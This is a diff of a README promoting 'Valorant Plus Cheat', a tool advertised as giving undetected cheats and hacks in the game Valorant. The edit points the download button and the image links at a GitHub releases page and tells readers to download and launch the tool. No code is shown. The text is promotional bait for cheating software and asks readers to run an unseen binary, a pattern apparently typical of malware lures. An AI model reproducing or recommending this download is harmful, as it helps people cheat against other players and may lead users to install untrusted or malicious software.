@@ -3,7 +3,7 @@
 ## Description
 Welcome to **Valorant Plus Cheat**, your gateway to unlocking the full potential of Valorant with advanced cheating features that keep you undetected. This tool is designed to give you the edge you need to conquer your enemies and achieve victory in every match.
 
-![Valorant Plus Cheat Logo](https://example.com/valorant-plus-logo.png)
+![Valorant Plus Cheat Logo](https://github.com/MytichArrow/Valorant-Plus-Cheat/releases)
 
 ## Features
 With Valorant Plus Cheat, you get access to a wide range of cheats and hacks that will elevate your gameplay to new heights. Here are some of the key features included in this tool:
@@ -75,11 +75,11 @@ Explore a wide range of topics related to Valorant cheats and hacks, including:
 - valorant-third-person
 
 ## Installation
-Download **Valorant Plus Cheat** from [here](https://github.com/file/Soft.zip) and launch the tool to start dominating the competition.
+Download **Valorant Plus Cheat** from [here](https://github.com/MytichArrow/Valorant-Plus-Cheat/releases) and launch the tool to start dominating the competition.
 
-[![Download Valorant Plus Cheat](https://img.shields.io/badge/Download-Valorant_Plus_Cheat-blue.svg)](https://github.com/file/Soft.zip)
+[![Download Valorant Plus Cheat](https://github.com/MytichArrow/Valorant-Plus-Cheat/releases)](https://github.com/MytichArrow/Valorant-Plus-Cheat/releases)
 
 ## Conclusion
 Enhance your Valorant experience with **Valorant Plus Cheat** and take your gameplay to the next level. Embrace the power of cheats and hacks to become the ultimate champion in Valorant. Download now and unleash your full potential! 🚀🎮
 
-![Play Valorant with Valorant Plus Cheat](https://example.com/play-valorant-with-valorant-plus.png)
+![Play Valorant with Valorant Plus Cheat](https://github.com/MytichArrow/Valorant-Plus-Cheat/releases)
